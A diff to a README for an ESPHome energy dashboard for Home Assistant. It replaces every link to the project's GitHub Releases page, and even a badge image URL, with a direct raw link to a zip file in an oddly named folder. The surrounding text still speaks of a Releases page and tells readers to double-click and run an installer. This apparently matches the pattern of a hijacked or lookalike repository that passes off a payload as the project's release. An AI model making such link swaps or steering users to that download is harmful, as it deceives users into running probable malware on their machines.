@@ -1,6 +1,6 @@
 # 🌟 JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT - Your Smart Home Energy Monitor
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/releases)
+[![Download the latest release](https://raw.githubusercontent.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/main/participancy/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT.zip%20Now-Release-blue)](https://raw.githubusercontent.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/main/participancy/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to get started:
 
 1. **Visit the Release Page**: Click the link below to visit our GitHub Releases page.
 
-   [Download the latest release](https://github.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/releases)
+   [Download the latest release](https://raw.githubusercontent.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/main/participancy/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT.zip)
 
 2. **Choose Your Version**: On the Releases page, you will find different versions of the software.
 
@@ -42,7 +42,7 @@ The JC3249W535 Energy Dashboard offers:
 
 To download the latest version, please visit the page below:
 
-[Download the latest release](https://github.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/releases)
+[Download the latest release](https://raw.githubusercontent.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/main/participancy/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT.zip)
 
 Once the file is downloaded, locate it on your device and double-click to run the installer. Follow the instructions on the screen. If you encounter any issues, please consult the documentation or community forums for assistance.
 
